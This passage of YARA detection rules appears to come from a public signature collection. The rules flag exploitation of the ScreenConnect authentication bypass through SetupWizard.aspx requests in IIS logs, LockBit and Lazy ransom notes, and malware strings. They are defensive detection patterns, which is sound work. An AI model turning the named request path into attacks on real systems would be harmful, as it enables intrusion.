		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ec4ac3f5c19f506a70eacb5fe3173cc06bf20567bbc9a96f3b269910382e5fa2"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff )" ascii
		$s2 = "C:\\\\ProgramData\\\\Browsers" ascii fullword
		$s3 = "curl_https($api_url." ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Connectwise_Screenconnect_Authentication_Bypass_Feb_2024_Exploitation_IIS_Logs
{
	meta:
		description = "Detects an http request to '/SetupWizard.aspx/' with anything following it, which when found in IIS logs is a potential indicator of compromise of the 2024 ConnectWise ScreenConnect (versions prior to 23.9.8) vulnerability that allows an Authentication Bypass"
		author = "Huntress DE&TH Team (modified by Florian Roth)"
		id = "2886530b-e164-4c4b-b01e-950e3c40acb4"
		date = "2024-02-20"
		modified = "2024-02-21"
		reference = "https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L3-L18"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "f6c7a3aa2ed98e754f9523c55eb035c7bc5f8aea96a6f86c729e9658d78710fb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = " GET /SetupWizard.aspx/" ascii
		$s2 = " POST /SetupWizard.aspx/" ascii
		$s3 = " PUT /SetupWizard.aspx/" ascii
		$s4 = " HEAD /SetupWizard.aspx/" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_MAL_SUSP_RANSOM_Lockbit_Ransomnote_Feb24
{
	meta:
		description = "Detects the LockBit ransom note file 'LockBit-DECRYPT.txt' which is a sign of a LockBit ransomware infection"
		author = "Florian Roth"
		id = "b2fcb2a7-49e8-520c-944f-6acd5ded579b"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L137-L149"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "1fe07c33de1971b1f9430851dec4b8cd9f3ac7f087f0de18a2da4a390891b674"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = ">>>> Your personal DECRYPTION ID:"

	condition:
		1 of them
}

rule SIGNATURE_BASE_MAL_SUSP_RANSOM_Lazy_Ransomnote_Feb24
{
	meta:
		description = "Detects the Lazy ransom note file 'HowToRestoreYourFiles.txt' which is a sign of a Lazy ransomware infection"
		author = "Florian Roth"
		id = "287dfd67-8d0d-5906-b593-3af42a5a3aa4"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L151-L163"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "c9416d05f0bd9aab9d6108380c1b5364f4c4e112b6e0726202f083eaacfdcf56"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "All Encrypted files can be reversed to original form and become usable"

	condition:
		1 of them
}

